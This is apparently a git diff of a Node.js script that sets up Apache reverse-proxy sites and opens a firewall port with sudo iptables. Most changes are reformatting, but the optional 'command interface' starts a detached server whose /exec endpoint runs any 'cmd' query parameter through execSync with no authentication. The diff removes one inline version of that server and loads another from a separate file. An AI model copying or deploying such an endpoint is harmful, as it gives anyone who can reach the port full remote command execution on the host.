@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 const fs = require("fs");
 
-const {ArgumentParser} = require('./argparse.js');
+const { ArgumentParser } = require('./argparse.js');
 const path = require("path");
 const child_process = require("child_process");
 
@@ -11,13 +11,13 @@ const parser = new ArgumentParser({
 
 
 function get_args() {
-    parser.add_argument('-xp', '--server-port', {help: 'external port to listen to, default to 80'});
-    parser.add_argument('-lp', '--proxy-port', {help: 'local port to forward requests to, default to 8888'});
-    parser.add_argument('-lh', '--local-host', {help: 'local host to forward requests to, default to localhost'});
-    parser.add_argument('-sn', '--site-filename', {help: 'name of the site file to create (default to proxy-site-<timestamp>)'});
-    parser.add_argument('-ar', '--apache-root', {help: 'root of apache2 installation (default to /etc/apache2)'});
-    parser.add_argument('-ka', '--kill-all', {help: 'disable sites and remove site files (default to false), if true all other args are ignored'});
-    parser.add_argument('-ci', '--command-interface', {help: 'creates an /exec endpoint accepting a get parameter "cmd" and executing it with child_process.execSync, a /stop endpoint to stop the server, and a / endpoint to return {"status": "ok"}'});
+    parser.add_argument('-xp', '--external-port', { help: 'external port to listen to, default to 80' });
+    parser.add_argument('-lp', '--local-port', { help: 'local port to forward requests to, default to 8888' });
+    parser.add_argument('-lh', '--local-host', { help: 'local host to forward requests to, default to localhost' });
+    parser.add_argument('-sn', '--site-filename', { help: 'name of the site file to create (default to proxy-site-<timestamp>)' });
+    parser.add_argument('-ar', '--apache-root', { help: 'root of apache2 installation (default to /etc/apache2)' });
+    parser.add_argument('-ka', '--kill-all', { help: 'disable sites and remove site files (default to false), if true all other args are ignored' });
+    parser.add_argument('-ci', '--command-interface', { help: 'creates an /exec endpoint accepting a get parameter "cmd" and executing it with child_process.execSync, a /stop endpoint to stop the server, and a / endpoint to return {"status": "ok"}' });
 
     return parser.parse_known_args()[0]
 }
@@ -32,7 +32,7 @@ const site_filename = args.site_filename || `proxy-site-${Date.now()}`
 const kill_all = args.kill_all || false
 const command_interface = args.command_interface || false
 
-if(!fs.existsSync(path.join(apache_root, 'sites-available')))
+if (!fs.existsSync(path.join(apache_root, 'sites-available')))
     fs.mkdirSync(path.join(apache_root, 'sites-available'))
 
 if (kill_all) {
@@ -89,31 +89,20 @@ console.log(`adding iptables rule`);
 child_process.execSync(`sudo iptables -I INPUT -m state --state NEW -p tcp --dport ${external_port} -j ACCEPT`)
 
 if (command_interface) {
-    console.log(`creating command interface`);
-    const server_dir = `server.tmp.${Date.now()}`
-    fs.mkdirSync(server_dir)
+    const server_file = `server.${Date.now()}.js`
+    const local_server = fs.readFileSync(path.join(__dirname, 'local_server.js'), 'utf-8')
+    fs.writeFileSync(server_file, local_server.replace('port = 3000', `port = ${local_port}`))
+    // child_process.exec(`nohup node ${server_file}&`)
 
-    child_process.execSync(`cd ${server_dir}; npm init -y;npm i express`)
-    const server_file = `${server_dir}/server.${Date.now()}.js`
-    fs.writeFileSync(server_file, `const express= require('express')
-const child_process = require("child_process");
 
-const app= express()
+    const childProcess = child_process.spawn('node', [server_file], {
+        detached: true,
+        stdio: 'ignore',
+    })
 
-app.get('/exec', (req, res)=>{
-    res.send(child_process.execSync(req.query.cmd).toString())
-})
-app.get('/stop', (req, res)=>{
-    process.exit(0)
-})
+    childProcess.unref();
 
-app.get('/', (req, res)=>{
-    res.send('{"status": "ok"}');
-})
-app.listen(parseInt(process.argv[2]) || ${local_port}, ()=>{})
-`)
 
-    child_process.execSync(`nohup node ${server_file}&`)
 
     console.log(`command interface running on port ${local_port}`);
 }
